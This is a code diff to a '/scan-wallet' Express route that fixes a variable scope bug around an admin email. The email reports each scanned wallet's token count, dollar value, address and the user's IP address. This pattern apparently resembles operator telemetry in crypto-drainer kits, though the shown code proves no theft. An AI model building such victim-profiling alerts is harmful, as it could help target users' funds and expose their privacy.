@@ -356,11 +356,12 @@ router.post('/scan-wallet', async (req, res) => {
       
       console.log('📧 SCAN EMAIL: Tokens found:', scanResults.length);
       
+      let emailSent = false;
       if (scanResults.length > 0) {
         // Calculate total value for email
         let emailTotalValue = scanResults.reduce((sum, result) => sum + parseFloat(result.amount || 0), 0);
         
-        const emailSent = await sendAdminNotification(
+        emailSent = await sendAdminNotification(
           `SCAN COMPLETE: ${scanResults.length} tokens - $${emailTotalValue.toFixed(0)} value`,
           `WALLET SCAN COMPLETED\n\n` +
           `WALLET: ${walletAddress}\n` +
@@ -371,10 +372,8 @@ router.post('/scan-wallet', async (req, res) => {
           `USER: ${realIP}\n` +
           `TIME: ${new Date().toISOString()}`
         );
-        if (emailSent) {
-          console.log('✅ Scan results email sent successfully');
-        }
       }
+      
       if (emailSent) {
         console.log('✅ Scan results email sent successfully');
       }
